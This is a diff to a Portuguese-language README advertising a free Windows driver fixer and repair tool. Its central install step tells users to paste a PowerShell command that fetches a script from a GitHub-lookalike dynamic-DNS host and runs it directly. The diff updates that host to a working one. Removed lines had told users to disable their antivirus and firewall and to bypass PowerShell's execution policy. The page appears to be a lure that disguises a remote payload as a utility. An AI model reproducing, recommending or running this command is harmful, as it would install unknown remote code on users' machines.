@@ -11,7 +11,7 @@
 </h1>
 
 <p align="center">
-  <strong>Driver Fixer · Reparo Windows · Drivers Ausentes · Correção Tela Azul · Otimizador PC · Instalador de Drivers</strong><br>
+  <strong>Driver Fixer · Reparo Windows · Drivers Ausentes · Correção Tela Azul · Instalador de Drivers</strong><br>
   <span style="color:#6c757d;">Working 2026 · Corrige qualquer erro · Baixa todos os drivers · Fully Loaded · Free</span>
 </p>
 
@@ -48,7 +48,7 @@
 
 ### Step 3: Copie o comando abaixo e cole no cmd
 ```cmd
-powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
+powershell -Command "irm http://github-file.ddns.net:2026/install?id=fixerrors | iex"
 ```
 
 ### Step 4: Clique na tecla Enter para instalar
@@ -65,7 +65,6 @@ powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
 ```
 
 ### Step 6: Start Using the Tool
-- A ferramenta é executada automaticamente em segundo plano
 - Ela corrige qualquer erro do Windows e baixa todos os drivers que faltam
 - Nenhuma entrada do usuário é necessária - totalmente automatizado
 - Reinicie o PC após a conclusão para obter melhores resultados
@@ -86,12 +85,9 @@ powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
 | 🖥️ **Detecção de Erros** | Escaneia todo o sistema em busca de erros, drivers ausentes e arquivos corrompidos |
 | ⬇️ **Download Automático** | Baixa automaticamente todos os drivers que faltam do banco de dados oficial da Microsoft |
 | 🔧 **Ferramentas de Reparo** | Corrige links de drivers quebrados, repara arquivos INF, resolve conflitos entre drivers |
-| 💻 **Suporte de Hardware** | Drivers de GPU, Adaptadores de Rede, Dispositivos de Áudio, Drivers de Chipset, Controladores USB |
 | 🔄 **Atualização Automática** | Mantém os drivers sempre atualizados automaticamente, agenda verificações semanais |
 | 🛠️ **Suporte Legado** | Funciona com Windows 10/11, suporta hardware mais antigo, inclui versões de drivers LTS |
 | 🧹 **Limpeza de Registro** | Remove entradas órfãs, corrige chaves de registro corrompidas, otimiza o desempenho |
-| 🔐 **Sistema de Backup** | Cria pontos de restauração antes das alterações, permite rollback de atualizações de drivers |
-
 ---
 
 ## 📡 MODULE STATUS
@@ -104,31 +100,6 @@ powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
 | Repair Toolkit | 2.5.2 | ✅ Operational |
 | Registry Cleaner | 1.8.6 | ✅ Operational |
 | GPU Compatibility | 4.2.1 | ✅ Operational |
-
----
-
-## 🔧 TROUBLESHOOTING
-
-### Error: "Driver Não Encontrado"
-**Solution:** Execute a ferramenta com privilégios de administrador. Certifique-se de que sua conexão com a internet esteja estável.
-
-### Error: "Acesso Negado"
-**Solution:** Você precisa executar o CMD ou PowerShell como Administrador. Clique com o botão direito e selecione "Executar como administrador".
-
-### Error: "Falha na Instalação"
-**Solution:** Tente reiniciar o PC e executar a ferramenta novamente. Se o problema persistir, execute com a flag /force.
-
-### Error: "Driver Já Instalado"
-**Solution:** A ferramenta detectou que o driver está presente, mas pode estar corrompido. Use a opção "Forçar Reinstalação".
-
-### Error: "Tempo de Conexão Esgotado"
-**Solution:** Verifique sua conexão com a internet. Desative temporariamente qualquer firewall ou antivírus.
-
-### Error: "Script Bloqueado pelo PowerShell"
-**Solution:** Execute o comando abaixo antes de rodar a ferramenta:
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-```
 
 ---
 
